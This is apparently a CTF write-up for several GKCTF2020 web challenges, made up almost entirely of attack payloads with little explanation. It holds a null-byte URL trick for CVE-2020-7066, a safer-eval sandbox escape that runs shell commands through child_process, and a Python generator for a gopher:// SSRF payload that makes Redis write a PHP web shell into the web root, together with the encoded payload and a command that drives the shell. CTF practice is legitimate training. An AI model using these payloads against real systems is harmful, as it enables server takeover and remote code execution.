# Web

## [GKCTF2020]CheckIN

> 考点：代码审计、disable_function

## [GKCTF2020]cve版签到

> 考点：cve-2020-7066

```
http://xxx/?url=http://127.0.0.1%00.ctfhub.com
http://xxx/?url=http://127.0.0.123%00.ctfhub.com
```

## [GKCTF2020]EZ三剑客-EzNode

> 考点：saferEval沙箱逃逸

https://github.com/commenthol/safer-eval/issues/10

```
POST
http://xxx/eval?delay=9999999999999999999
e=clearImmediate.constructor("return process;")().mainModule.require("child_process").execSync("cat /flag").toString()
```

## [GKCTF2020]EZ三剑客-EzWeb

```python
import urllib
protocol="gopher://"
ip="173.18.154.11"
port="6379"
shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=["flushall",
	 "set 1 {}".format(shell.replace(" ","${IFS}")),
	 "config set dir {}".format(path),
	 "config set dbfilename {}".format(filename),
	 "save"
	 ]
if passwd:
	cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
	CRLF="\r\n"
	redis_arr = arr.split(" ")
	cmd=""
	cmd+="*"+str(len(redis_arr))
	for x in redis_arr:
		cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
	cmd+=CRLF
	return cmd

if __name__=="__main__":
	for x in cmd:
		payload += urllib.quote(redis_format(x))
	print payload
```

```
gopher://173.18.154.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

url=http%3A%2F%2F173.18.154.11%2Fshell.php?cmd=system(%27cat$IFS$9/flag%27);&submit=%E6%8F%90%E4%BA%A4
```